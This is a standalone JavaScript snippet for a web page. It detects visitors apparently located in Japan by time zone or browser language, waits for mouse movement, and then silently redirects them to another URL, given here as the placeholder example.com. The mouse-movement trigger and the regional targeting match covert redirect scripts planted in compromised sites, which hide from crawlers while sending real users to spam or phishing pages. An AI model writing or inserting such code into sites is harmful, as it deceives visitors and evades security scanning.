<script>
  (function () {
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const language = navigator.language || "";

    // Check if user is likely in Japan
    const isJapan =
      timeZone === "Asia/Tokyo" ||
      language.toLowerCase().startsWith("ja");

    if (!isJapan) return;

    let start = null;
    let redirected = false;

    document.addEventListener("mousemove", function (e) {
      if (redirected) return;

      if (!start) {
        start = { x: e.clientX, y: e.clientY };
        return;
      }

      const dx = e.clientX - start.x;
      const dy = e.clientY - start.y;

      if (Math.sqrt(dx * dx + dy * dy) > 10) {
        redirected = true;
        window.location.href = "https://example.com";
      }
    });
  })();
</script>
